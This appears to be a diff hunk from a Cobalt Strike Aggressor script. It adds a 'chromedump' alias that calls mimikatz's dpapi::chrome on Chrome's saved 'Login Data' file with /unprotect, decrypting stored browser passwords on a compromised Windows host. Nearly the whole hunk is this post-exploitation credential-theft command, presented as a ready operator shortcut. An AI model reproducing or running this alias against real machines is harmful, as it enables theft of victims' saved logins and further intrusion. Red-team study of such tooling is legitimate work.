@@ -55,3 +55,9 @@ sub com_exec_go {
 	bstage($1, $2, $3);
 }
 
+
+# Chrome dump per #armitage IRC:
+#   -`butane
+alias chromedump { 
+	bmimikatz($1, "dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect"); 
+}
